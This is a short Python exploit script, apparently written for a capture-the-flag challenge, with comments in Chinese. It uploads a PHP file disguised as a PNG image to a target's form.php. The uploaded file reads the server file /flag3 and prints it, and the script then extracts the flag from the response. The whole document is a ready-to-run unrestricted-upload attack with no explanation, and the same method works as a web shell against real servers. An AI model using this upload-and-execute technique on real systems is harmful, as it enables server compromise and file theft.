import requests
import sys
import re
import time
def upload_exp(ip, port):
    # 示例用法
    url = f'http://{ip}:{port}/form.php'  # 使用传入的IP和端口构建URL

    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183',
    }
    filename = 'catflag1.php'

    # 要上传的文件内容（示例中使用字符串）
    content = '''<?php $file_path = '/flag3';  $content = file_get_contents($file_path); echo $content; ?>'''
    files = {'file': (filename, content, 'image/png')}
    response = requests.post(url=url, files=files)

    if response.status_code != 200:
        print('web error')
        exit()

    if 'Success' in response.text:
        print('上传成功')
    time.sleep(2) 
    pattern = r'flag{(.+?)}'
    response = requests.post(url=url)
    matches = re.search(pattern, response.text)
    print(response.text)
    if matches:
        flag = "flag{" + matches.group(1) + "}"
        print(flag)
    else:
        print("Flag not found.")

if __name__ == '__main__':
    # 获取命令行参数
    ip=sys.argv[1]
    port=int(sys.argv[2])
    upload_exp(ip, port)